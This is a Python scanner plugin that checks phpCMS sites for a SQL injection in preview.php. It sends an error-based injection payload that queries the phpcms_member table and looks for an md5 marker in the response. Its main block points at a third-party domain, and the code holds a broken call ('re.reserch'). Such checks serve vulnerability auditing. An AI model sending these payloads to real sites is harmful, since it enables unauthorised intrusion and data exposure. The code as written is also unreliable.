#!/usr/bin/python2.7
#coding:utf-8

import requests
from dummy import *
import re

info = {
	'NAME':'phpcms_preview_php_sql_injection',
	'AUTHOR':'range,wjk',
	'TIME':'20150325',
	'WEB':'http://www.wooyun.org/bugs/wooyun-2013-022112',
	'DESCRIPTION':'phpcms_preview_php_sql_injection'
}
opts = [
	['url','http://testasp.vulnweb.com','target url'],
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'phpCMS':
			return True
	return False

def Audit(services):
	url = services['url'] +"/preview.php?info[catid]=15&content=a[page]b&info[contentid]=2' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,md5(1),0x3a,md5(1),0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x limit 0,1)a)-- a"
	try:
		rqu =requests.get(url)
		res = rqu.text 
		m = re.reserch('c4ca4238a0b923820dcc509a6f75849b',res)
		if m :
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
